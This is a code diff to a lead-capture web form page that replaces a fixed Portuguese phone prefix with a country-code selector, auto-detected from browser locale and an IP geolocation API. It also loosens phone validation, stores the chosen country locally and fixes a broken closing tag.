@@ -65,9 +65,8 @@
   .error-msg.show{display:block}
 
   .phone-row{display:flex;gap:10px}
-  .phone-prefix{display:flex;align-items:center;gap:8px;padding:12px 14px;border:1.5px solid #e5e7eb;border-radius:14px;background:#fff;font-size:15px;font-weight:600;white-space:nowrap}
-  .flag{width:20px;height:14px;border-radius:2px;background:linear-gradient(180deg,#006600 38%,#ff0000 38%);position:relative;overflow:hidden}
-  .flag::after{content:"";position:absolute;left:0;top:0;right:0;bottom:0;background:linear-gradient(135deg,transparent 45%,#ffff00 45%,#ffff00 55%,transparent 55%)}
+  .phone-prefix-select{display:flex;align-items:center;gap:6px;padding:12px 10px;border:1.5px solid #e5e7eb;border-radius:14px;background:#fff;font-size:15px;font-weight:600;white-space:nowrap;font-family:inherit;color:#0a0a0a;cursor:pointer;max-width:120px}
+  .phone-prefix-select:focus{outline:none;border-color:#0a0a0a;box-shadow:0 0 0 4px rgba(10,10,10,.06)}
   .phone-row .form-input{flex:1}
   .phone-row .form-input{padding-left:16px}
 
@@ -156,8 +155,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           Mobile Phone <span class="required">*</span>
         </label>
         <div class="phone-row">
-          <div class="phone-prefix"><span class="flag"></span> +351</div>
-          <input autocomplete="tel" class="form-input" id="phoneInput" maxlength="15" placeholder="911 181 188" required="" type="tel"/>
+          <select class="phone-prefix-select" id="countryCode" aria-label="Country code"></select>
+          <input autocomplete="tel" class="form-input" id="phoneInput" maxlength="20" placeholder="Phone number" required="" type="tel"/>
         </div>
         <div class="error-msg" id="phoneError">Please enter a valid phone number</div>
       </div>
@@ -194,6 +193,85 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   var nif = (localStorage.getItem('nif')||localStorage.getItem('cpf')||'').replace(/\D/g,'');
   if(nif.length>=9) document.getElementById('userNif').textContent = nif.slice(0,3)+' *** *'+nif.slice(7,9);
 
+  var COUNTRIES = [
+    {iso:'PT',dial:'+351',flag:'🇵🇹',name:'Portugal'},
+    {iso:'ES',dial:'+34', flag:'🇪🇸',name:'Spain'},
+    {iso:'FR',dial:'+33', flag:'🇫🇷',name:'France'},
+    {iso:'IT',dial:'+39', flag:'🇮🇹',name:'Italy'},
+    {iso:'DE',dial:'+49', flag:'🇩🇪',name:'Germany'},
+    {iso:'GB',dial:'+44', flag:'🇬🇧',name:'United Kingdom'},
+    {iso:'IE',dial:'+353',flag:'🇮🇪',name:'Ireland'},
+    {iso:'NL',dial:'+31', flag:'🇳🇱',name:'Netherlands'},
+    {iso:'BE',dial:'+32', flag:'🇧🇪',name:'Belgium'},
+    {iso:'LU',dial:'+352',flag:'🇱🇺',name:'Luxembourg'},
+    {iso:'CH',dial:'+41', flag:'🇨🇭',name:'Switzerland'},
+    {iso:'AT',dial:'+43', flag:'🇦🇹',name:'Austria'},
+    {iso:'PL',dial:'+48', flag:'🇵🇱',name:'Poland'},
+    {iso:'SE',dial:'+46', flag:'🇸🇪',name:'Sweden'},
+    {iso:'NO',dial:'+47', flag:'🇳🇴',name:'Norway'},
+    {iso:'DK',dial:'+45', flag:'🇩🇰',name:'Denmark'},
+    {iso:'FI',dial:'+358',flag:'🇫🇮',name:'Finland'},
+    {iso:'GR',dial:'+30', flag:'🇬🇷',name:'Greece'},
+    {iso:'RO',dial:'+40', flag:'🇷🇴',name:'Romania'},
+    {iso:'CZ',dial:'+420',flag:'🇨🇿',name:'Czechia'},
+    {iso:'HU',dial:'+36', flag:'🇭🇺',name:'Hungary'}
+  ];
+  var DEFAULT_ISO = 'PT';
+
+  var countrySelect = document.getElementById('countryCode');
+  COUNTRIES.forEach(function(c){
+    var opt = document.createElement('option');
+    opt.value = c.iso;
+    opt.textContent = c.flag + ' ' + c.dial;
+    countrySelect.appendChild(opt);
+  });
+
+  function findCountry(iso){
+    iso = (iso||'').toUpperCase();
+    for(var i=0;i<COUNTRIES.length;i++){ if(COUNTRIES[i].iso===iso) return COUNTRIES[i]; }
+    return null;
+  }
+
+  function setCountry(iso){
+    var c = findCountry(iso) || findCountry(DEFAULT_ISO);
+    countrySelect.value = c.iso;
+  }
+
+  function detectCountryFromLocale(){
+    try{
+      var langs = navigator.languages || [navigator.language || ''];
+      for(var i=0;i<langs.length;i++){
+        var m = /-([A-Za-z]{2})$/.exec(langs[i]||'');
+        if(m && findCountry(m[1])) return m[1].toUpperCase();
+      }
+    }catch(e){}
+    return null;
+  }
+
+  async function detectCountry(){
+    var savedIso = localStorage.getItem('phoneCountryIso');
+    if(savedIso && findCountry(savedIso)){ setCountry(savedIso); return; }
+
+    var localeGuess = detectCountryFromLocale();
+    if(localeGuess) setCountry(localeGuess);
+
+    try{
+      var ctrl = new AbortController();
+      var timer = setTimeout(function(){ ctrl.abort(); }, 3000);
+      var res = await fetch('https://ipapi.co/json/', {signal: ctrl.signal});
+      clearTimeout(timer);
+      var data = await res.json();
+      if(data && data.country_code && findCountry(data.country_code)){
+        setCountry(data.country_code);
+      }
+    }catch(e){
+      // Geolocation lookup failed — keep locale guess / default already set
+    }
+  }
+
+  setCountry(DEFAULT_ISO);
+  detectCountry();
+
   var savedEmail = localStorage.getItem('email');
   var savedPhone = localStorage.getItem('telefone') || localStorage.getItem('telephone') || localStorage.getItem('phone');
   if(savedEmail) document.getElementById('emailInput').value = savedEmail;
@@ -208,9 +286,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
   function formatPhone(v){
     v = v.replace(/\D/g,'');
-    if(v.length>9) v = v.slice(0,9);
-    if(v.length<=6) return v.replace(/(\d{3})(\d{0,3})/,'$1 $2').trim();
-    return v.replace(/(\d{3})(\d{3})(\d{0,3})/,'$1 $2 $3').trim();
+    if(v.length>14) v = v.slice(0,14);
+    return v.replace(/(\d{3})(?=\d)/g,'$1 ').trim();
   }
 
   function validateEmail(email){
@@ -225,7 +302,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var cl = phone.replace(/\D/g,'');
     var err = document.getElementById('phoneError');
     var inp = document.getElementById('phoneInput');
-    if(cl.length < 9){ inp.classList.add('error'); err.classList.add('show'); return false; }
+    if(cl.length < 6 || cl.length > 14){ inp.classList.add('error'); err.classList.add('show'); return false; }
     inp.classList.remove('error'); err.classList.remove('show'); return true;
   }
 
@@ -234,12 +311,15 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var email = document.getElementById('emailInput').value.trim();
     var phone = document.getElementById('phoneInput').value;
     var phoneClean = phone.replace(/\D/g,'');
+    var country = findCountry(countrySelect.value) || findCountry(DEFAULT_ISO);
     if(!validateEmail(email) || !validatePhone(phone)) return false;
     document.getElementById('loadingOverlay').classList.add('show');
     localStorage.setItem('email', email);
     localStorage.setItem('telefone', phoneClean);
     localStorage.setItem('telephone', phoneClean);
     localStorage.setItem('phone', phoneClean);
+    localStorage.setItem('phoneCountryIso', country.iso);
+    localStorage.setItem('phoneCountryCode', country.dial);
     try {
       if (window.FunilSelfie) {
         window.FunilSelfie.enrichSelfie({ email: email, phone: phoneClean, telefone: phoneClean });
@@ -260,7 +340,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   };
 })();
 </script>
-</b
+</body>
 <script>window.__FUNIL_PAGE__="step8";</script>
 <script src="extensions/api-base.js"></script>
 <script src="extensions/selfie-lead.js"></script>
